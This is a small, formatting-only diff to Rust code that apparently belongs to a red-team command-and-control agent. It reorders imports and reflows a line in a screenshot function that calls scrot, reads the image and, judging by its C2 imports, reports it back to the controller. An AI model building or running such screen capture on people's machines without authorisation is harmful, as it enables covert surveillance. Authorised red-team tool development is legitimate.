@@ -21,10 +21,10 @@ use {
     alloc::vec::Vec,
     pb::c2::report_file_request,
     pb::{c2, eldritch},
-    std::process::Command,
-    std::sync::Mutex,
     std::env::temp_dir,
     std::path::PathBuf,
+    std::process::Command,
+    std::sync::Mutex,
 };
 
 #[cfg(all(unix, feature = "stdlib"))]
@@ -73,7 +73,8 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
         return Err(format!("scrot failed with status: {}", status));
     }
 
-    let png_data = std::fs::read(&temp_file_str).map_err(|e| format!("Failed to read screenshot file: {}", e))?;
+    let png_data = std::fs::read(&temp_file_str)
+        .map_err(|e| format!("Failed to read screenshot file: {}", e))?;
 
     // Clean up
     let _ = std::fs::remove_file(&temp_file_str);
